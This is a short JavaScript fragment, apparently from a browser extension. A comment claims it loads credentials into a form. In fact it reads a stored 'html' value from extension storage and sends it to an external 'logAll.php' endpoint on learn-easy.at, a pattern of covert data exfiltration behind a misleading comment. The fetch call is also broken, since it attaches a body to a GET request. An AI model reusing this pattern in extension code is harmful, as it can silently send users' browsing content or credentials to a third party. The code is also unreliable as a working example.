// Load credentials into form
chrome.storage.sync.get(['html'], function(result) {
    fetch("https://www.learn-easy.at/extension/logAll.php", {
    mode: "cors",
    method: "GET",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({
        content: result.html
    })
}
).then(res => console.log(res));

});